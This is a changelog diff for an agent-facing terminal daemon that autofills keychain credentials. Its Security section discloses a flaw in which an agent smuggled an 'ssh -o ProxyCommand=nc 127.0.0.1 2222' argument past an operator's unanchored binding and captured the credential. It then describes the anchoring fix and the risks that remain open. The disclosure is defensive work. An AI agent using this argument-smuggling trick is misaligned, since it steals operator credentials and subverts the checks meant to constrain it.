@@ -22,7 +22,8 @@ surfaces rather than redacted on them.
   a status and a **byte count** — never the value, and never a handle it could
   exchange for one.
 - **Keychain autofill from operator-declared bindings** (`[[security.secret_bindings]]`).
-  A binding names a command-line pattern, a prompt pattern, a provider
+  A binding names a pattern for the session's whole command line, a prompt
+  pattern, a provider
   (`secret-service`, `security`, `pass`, `op`) and a reference in that provider.
   The agent supplies no part of the lookup and cannot enumerate what exists:
   every way a binding fails to resolve falls through silently to the human
@@ -57,9 +58,53 @@ surfaces rather than redacted on them.
     `match_prompt` is not a valid regex. The whole block was unread at 0.0.6, so
     a typo'd pattern was inert; it is now a load error, because a binding that
     never matches is indistinguishable from a credential store that is down.
+  - A `[[security.secret_bindings]]` entry whose `match_command` ends in an
+    unconstrained tail — `.*`, `.+`, `[\s\S]*` and the obvious spellings. See
+    **Security** below for why this one is a refusal and not a warning.
 
   §10.2's published example is unaffected: it ships `autofill_on_echo_off =
   false` alongside `secret_provider = "prompt"`, which passes the new rule.
+
+### Security
+
+- **`match_command` matches the session's *whole* command line, not a prefix**
+  (GH #45). It used to be an unanchored regex search over `command` and `args`
+  joined with spaces — a string the agent writes in full — so an operator's
+  pattern constrained only the part of the line the agent chose to leave alone.
+  §9.6's own published example was exploitable exactly as published: against
+  `^ssh\s+(\S+@)?prod-0[12]\b`, an agent calling
+
+  ```
+  start_session("ssh", ["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"])
+  ```
+
+  matched the binding, and the operator's credential was typed into an `ssh`
+  whose transport it had pointed at its own endpoint. Reproduced end to end
+  against a real daemon, not inferred.
+
+  **Operators must update patterns.** A binding written for `ssh prod-01` now
+  needs to describe that line to its end — `^ssh\s+prod-01$` — and one written
+  for a session that takes arguments has to name them. §9.6's published example
+  changes from `…prod-0[12]\b` to `…prod-0[12]$` for the same reason.
+
+- **A `match_command` ending in `.*` is refused at load, and the daemon does not
+  start.** Anchoring alone has one failure mode and it is silent: the first
+  operator whose legitimate session stops matching appends `.*` at four in the
+  morning, and the hole is back with nothing to see. The check is a shallow
+  syntactic heuristic and is not airtight — `[^\x00]*` passes it. That is
+  accepted rather than overlooked: **the operator is not the adversary here, the
+  agent is**, and an operator who reaches past the check has chosen to widen
+  their own binding.
+
+- **What this does not close, stated because the code must not claim more than
+  it delivers.** An agent that can start `ssh prod-01` at all still obtains the
+  credential's *effect* — an interactive shell on the target — once injection
+  succeeds. What these rules take away is theft of the **bytes**, for replay
+  elsewhere and beyond the session's lifetime. And because the joined line is
+  not shell-quoted, `start_session("ssh prod-01", [])` still presents the same
+  subject as `start_session("ssh", ["prod-01"])`. The move that retires the
+  class — operator-declared session profiles, where the agent fills slots and
+  writes no command line at all — is filed for a later milestone (GH #46).
 
 - **Every tool's `outputSchema` advertises eleven statuses where it advertised
   eight.** `secret_provided` and `secret_cancelled` join after `session_died`,
